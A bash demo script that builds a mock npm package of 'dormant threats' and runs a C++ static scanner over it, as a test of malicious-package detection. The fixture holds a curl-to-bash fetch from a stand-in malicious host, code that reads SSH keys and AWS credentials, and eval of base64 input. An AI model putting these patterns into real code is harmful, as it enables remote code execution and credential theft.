#!/bin/bash

echo "=== Static Scanner Demo ==="
echo
echo "Testing post-install static analysis for dormant threat detection..."
echo

# Create a mock node_modules structure with the test package
TEST_DIR="/tmp/shadow_static_test_$$"
mkdir -p "$TEST_DIR/node_modules/shadow-test-static-threats"

# Create test package inline
cat > "$TEST_DIR/node_modules/shadow-test-static-threats/package.json" << 'EOF'
{
  "name": "shadow-test-static-threats",
  "version": "1.0.0",
  "description": "Test package with dormant threats for static analysis"
}
EOF

cat > "$TEST_DIR/node_modules/shadow-test-static-threats/index.js" << 'EOF'
// Test package with dormant malicious patterns
const fs = require('fs');
const { exec } = require('child_process');

// 1. eval(Buffer.from base64)
function hiddenPayload() {
    eval(Buffer.from('Y29uc29sZS5sb2coIk1hbGljaW91cyBwYXlsb2FkISIp', 'base64'));
}

// 2. Large base64 payload
const encryptedPayload = "VGhpcyBpcyBhIHRlc3QgZW5jcnlwdGVkIHBheWxvYWQgdGhhdCB3b3VsZCBub3JtYWxseSBjb250YWluIG1hbGljaW91cyBjb2RlLiBJdCBpcyBsb25nIGVub3VnaCB0byB0cmlnZ2VyIHRoZSBzdGF0aWMgYW5hbHlzaXMgZGV0ZWN0aW9uIGZvciBsYXJnZSBiYXNlNjQgc3RyaW5ncy4gVGhpcyBpcyBqdXN0IGEgdGVzdCBidXQgaW4gYSByZWFsIGF0dGFjayB0aGlzIHdvdWxkIGNvbnRhaW4gb2JmdXNjYXRlZCBtYWx3YXJlIG9yIGVuY3J5cHRlZCBwYXlsb2FkcyB0aGF0IGFyZSBkZWNyeXB0ZWQgYW5kIGV4ZWN1dGVkIGF0IHJ1bnRpbWUuIFRoaXMgaXMgYSBjb21tb24gdGVjaG5pcXVlIHVzZWQgYnkgbWFsaWNpb3VzIGFjdG9ycyB0byBoaWRlIHRoZWlyIHBheWxvYWRzIGZyb20gc3RhdGljIGFuYWx5c2lzIHRvb2xzLg==";

// 3. Suspicious process spawning
function backdoorFunction() {
    exec('curl -s http://malicious.com/payload.sh | bash', (error, stdout, stderr) => {
        console.log('Backdoor activated');
    });
}

// 4. Credential file access
function stealCredentials() {
    try {
        const sshKey = fs.readFileSync('/home/user/.ssh/id_rsa', 'utf8');
        const awsCreds = fs.readFileSync('/home/user/.aws/credentials', 'utf8');
        return { sshKey, awsCreds };
    } catch (e) {
        return null;
    }
}

// 5. Heavy obfuscation
const obfuscated = "\u0065\u0076\u0061\u006c\u0028\u0042\u0075\u0066\u0066\u0065\u0072";

module.exports = { hiddenPayload, backdoorFunction, stealCredentials, encryptedPayload, obfuscated };
EOF

echo "Test package deployed to: $TEST_DIR/node_modules/"
echo "Package contains:"
echo "  • eval(Buffer.from base64) pattern"
echo "  • Large encrypted base64 payload (>500 chars)"
echo "  • Suspicious child_process.exec patterns"
echo "  • Credential file access code"
echo "  • Heavy unicode obfuscation"
echo

# Test the static scanner directly (create a simple test program)
cat > /tmp/test_static_scanner.cpp << 'EOF'
#include "/home/aadesh/Desktop/Shadow/core/include/static_scanner.h"
#include <iostream>

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: test_static_scanner <directory>" << std::endl;
        return 1;
    }
    
    StaticScanner scanner;
    StaticScanResult result = scanner.scan_node_modules(argv[1]);
    
    std::cout << "\n=== STATIC SCAN RESULTS ===" << std::endl;
    std::cout << "Files scanned: " << result.files_scanned << std::endl;
    std::cout << "Findings: " << (result.has_findings ? "YES" : "NO") << std::endl;
    
    if (result.has_findings) {
        std::cout << "\nThreat categories detected:" << std::endl;
        if (result.eval_patterns > 0) std::cout << "  • eval(base64) patterns: " << result.eval_patterns << std::endl;
        if (result.base64_payloads > 0) std::cout << "  • Large base64 payloads: " << result.base64_payloads << std::endl;
        if (result.obfuscated_code > 0) std::cout << "  • Obfuscated code: " << result.obfuscated_code << std::endl;
        if (result.suspicious_processes > 0) std::cout << "  • Suspicious processes: " << result.suspicious_processes << std::endl;
        if (result.credential_access > 0) std::cout << "  • Credential access: " << result.credential_access << std::endl;
        
        std::cout << "\nDetailed findings:" << std::endl;
        for (const auto& finding : result.findings) {
            std::cout << "  • " << finding << std::endl;
        }
    }
    
    return 0;
}
EOF

echo "Compiling static scanner test..."
g++ -std=c++17 -I/home/aadesh/Desktop/Shadow/core/include \
    /tmp/test_static_scanner.cpp \
    /home/aadesh/Desktop/Shadow/core/src/static_scanner.cpp \
    -o /tmp/test_static_scanner

if [ $? -eq 0 ]; then
    echo "Running static analysis on test package..."
    /tmp/test_static_scanner "$TEST_DIR"
else
    echo "Failed to compile test program"
fi

# Cleanup
rm -rf "$TEST_DIR"
rm -f /tmp/test_static_scanner /tmp/test_static_scanner.cpp

echo
echo "=== Demo Complete ==="